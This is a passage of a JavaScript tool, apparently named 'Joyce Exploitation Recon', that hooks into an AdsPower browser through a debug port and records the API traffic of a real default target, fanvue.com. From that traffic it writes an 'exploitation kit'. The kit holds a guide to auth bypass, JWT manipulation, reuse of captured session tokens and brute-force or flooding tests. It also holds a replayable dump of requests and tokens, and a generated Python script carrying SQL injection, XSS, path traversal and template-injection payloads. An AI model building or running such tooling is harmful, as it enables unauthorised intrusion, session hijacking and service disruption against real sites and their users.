          report += `**Required Headers:**\n`;
          Object.entries(endpoint.parameters.headers).forEach(([key, value]) => {
            report += `- \`${key}\`: ${value}\n`;
          });
          report += `\n`;
        }
        
        // Example response
        if (endpoint.responses.length > 0 && endpoint.responses[0].body) {
          report += `**Example Response:**\n\`\`\`json\n`;
          const resp = JSON.stringify(endpoint.responses[0].body, null, 2);
          report += resp.length > 1000 ? resp.substring(0, 1000) + '\n...' : resp;
          report += `\n\`\`\`\n\n`;
        }
        
        report += `---\n\n`;
      });
    });
    
    // Exploitation guide
    report += `## 💀 Exploitation Guide\n\n`;
    report += `### Step 1: Authentication Bypass\n\n`;
    report += `Based on discovered auth methods, try:\n`;
    report += `- Manipulating JWT tokens\n`;
    report += `- Reusing discovered session tokens\n`;
    report += `- Testing endpoints without auth headers\n\n`;
    
    report += `### Step 2: Parameter Fuzzing\n\n`;
    report += `Target these parameters:\n`;
    Array.from(this.exploitableParams.keys()).slice(0, 10).forEach(param => {
      report += `- \`${param}\`\n`;
    });
    report += `\n`;
    
    report += `### Step 3: Rate Limit Testing\n\n`;
    if (rateLimited.length === 0) {
      report += `No rate limits detected! Test for:\n`;
      report += `- Brute force attacks\n`;
      report += `- Resource exhaustion\n`;
      report += `- Parallel request flooding\n`;
    }
    
    return report;
  }

  async saveExploitationKit(filename) {
    const report = this.generateExploitationReport();
    await fs.writeFile(filename, report);
    console.log(`\n💀 Exploitation report saved to ${filename}`);
    
    // Save raw data for automation
    const exploitData = {
      domain: this.domain,
      endpoints: Array.from(this.endpoints.entries()).map(([key, endpoint]) => ({
        key,
        ...endpoint,
        requests: endpoint.requests.slice(-5), // Last 5 requests
        responses: endpoint.responses.slice(-5) // Last 5 responses
      })),
      hiddenEndpoints: Array.from(this.hiddenEndpoints),
      exploitableParams: Object.fromEntries(this.exploitableParams),
      authTokenEvolution: this.authTokenEvolution,
      websockets: Array.from(this.websocketProtocols.entries()),
      apiVersions: Array.from(this.apiVersions),
      requestSequences: this.requestSequences.slice(-50) // Last 50 requests for replay
    };
    
    const jsonFile = filename.replace('.md', '-exploitation-kit.json');
    await fs.writeFile(jsonFile, JSON.stringify(exploitData, null, 2));
    console.log(`🔧 Exploitation kit saved to ${jsonFile}`);
    
    // Generate Python exploitation script
    const pythonScript = this.generatePythonExploit();
    const scriptFile = filename.replace('.md', '-exploit.py');
    await fs.writeFile(scriptFile, pythonScript);
    console.log(`🐍 Python exploit script saved to ${scriptFile}`);
  }

  generatePythonExploit() {
    const endpoint = Array.from(this.endpoints.values())[0];
    
    return `#!/usr/bin/env python3
"""
Joyce Exploitation Script 👑😈
Generated: ${new Date().toISOString()}
Target: ${this.domain}
"""

import requests
import json
import time
from urllib.parse import urljoin

class ${this.domain.replace(/\./g, '_')}Exploit:
    def __init__(self):
        self.base_url = "https://${this.domain}"
        self.session = requests.Session()
        
        # Discovered authentication
        self.headers = {
            ${endpoint.parameters.headers ? Object.entries(endpoint.parameters.headers)
              .map(([k, v]) => `"${k}": "${v}"`)
              .join(',\n            ') : ''}
        }
        
        self.session.headers.update(self.headers)
    
    def test_endpoints(self):
        """Test discovered endpoints"""
        endpoints = [
            ${Array.from(this.endpoints.values()).slice(0, 5)
              .map(ep => `("${ep.method}", "${ep.pattern}")`)
              .join(',\n            ')}
        ]
        
        for method, path in endpoints:
            try:
                response = self.session.request(method, urljoin(self.base_url, path))
                print(f"{method} {path}: {response.status_code}")
            except Exception as e:
                print(f"Error testing {path}: {e}")
    
    def fuzz_parameters(self):
        """Fuzz discovered parameters"""
        payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "$\{7*7}",
            "%00",
            "999999999999"
        ]
        
        # Test each payload
        for payload in payloads:
            print(f"Testing payload: {payload}")
            # Add fuzzing logic here
    
    def exploit(self):
        """Main exploitation flow"""
        print("👑😈 Starting exploitation...")
        
        # Test endpoints
        self.test_endpoints()
        
        # Fuzz parameters
        self.fuzz_parameters()
        
        print("💀 Exploitation complete!")

if __name__ == "__main__":
    exploit = ${this.domain.replace(/\./g, '_')}Exploit()
    exploit.exploit()
`;
  }
}

// Main execution
async function main() {
  const debugPort = process.argv[2] || '63812';
  const targetUrl = process.argv[3] || 'https://fanvue.com/';
  const duration = parseInt(process.argv[4]) || 120; // seconds
  
  console.log('👑😈 Joyce Exploitation Recon - MAXIMUM DEVASTATION MODE');
  console.log('💀 This captures EVERYTHING for complete exploitation');
  console.log(`🔌 AdsPower Port: ${debugPort}`);
  console.log(`🎯 Target: ${targetUrl}`);
  console.log(`⏱️ Duration: ${duration} seconds`);
  
  const joyce = new JoyceExploitationRecon(debugPort);
  await joyce.connect();
  
  await joyce.performExploitation(targetUrl, {
    duration: duration * 1000,
    aggressive: true
  });
  
  const domain = new URL(targetUrl).hostname.replace(/\./g, '-');
  const filename = `joyce-exploit-${domain}-${Date.now()}.md`;
  await joyce.saveExploitationKit(filename);
  
  console.log('\n👑😈 Joyce has achieved MAXIMUM DEVASTATION!');
  console.log('💀 Use the exploitation kit wisely...');
}

main().catch(console.error);